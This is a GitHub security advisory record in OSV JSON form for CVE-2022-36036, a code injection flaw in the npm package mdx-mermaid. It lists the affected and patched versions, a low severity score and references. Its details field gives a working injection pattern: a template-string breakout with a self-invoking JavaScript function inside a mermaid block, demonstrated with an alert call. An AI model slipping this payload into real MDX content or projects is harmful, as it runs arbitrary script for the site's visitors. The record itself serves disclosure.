{
  "schema_version": "1.4.0",
  "id": "GHSA-rvgm-35jw-q628",
  "modified": "2022-09-08T14:12:04Z",
  "published": "2022-08-31T22:26:11Z",
  "aliases": [
    "CVE-2022-36036"
  ],
  "summary": "Improper Control of Generation of Code ('Code Injection') in mdx-mermaid",
  "details": "### Impact\n\nArbitary javascript injection\n\nModify any mermaid code blocks with the following code and the code inside will execute when the component is loaded by MDXjs\n\n```\n` + (function () {\n  // Put Javascript code here\n  return ''\n}()) + `\n```\n\nThe block below shows a valid mermaid code block\n\n````md\n```mermaid\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n````\n\nThe same block but with the exploit added\n\n````md\n```mermaid\n` + (function () {\n  alert('vulnerable')\n  return ''\n}()) + `\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n````\n\n### Patches\n1.3.0 and 2.0.0-rc2\n\n### Workarounds\nNone known",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "mdx-mermaid"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.3.0"
            }
          ]
        }
      ]
    },
    {
      "package": {
        "ecosystem": "npm",
        "name": "mdx-mermaid"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.0.0-rc1"
            },
            {
              "fixed": "2.0.0-rc2"
            }
          ]
        }
      ],
      "versions": [
        "2.0.0-rc1"
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/sjwall/mdx-mermaid/security/advisories/GHSA-rvgm-35jw-q628"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36036"
    },
    {
      "type": "WEB",
      "url": "https://github.com/sjwall/mdx-mermaid/commit/f2b99386660fd13316823529c3f1314ebbcdfd2a"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/sjwall/mdx-mermaid"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-94"
    ],
    "severity": "LOW",
    "github_reviewed": true,
    "github_reviewed_at": "2022-08-31T22:26:11Z",
    "nvd_published_at": "2022-08-29T18:15:00Z"
  }
}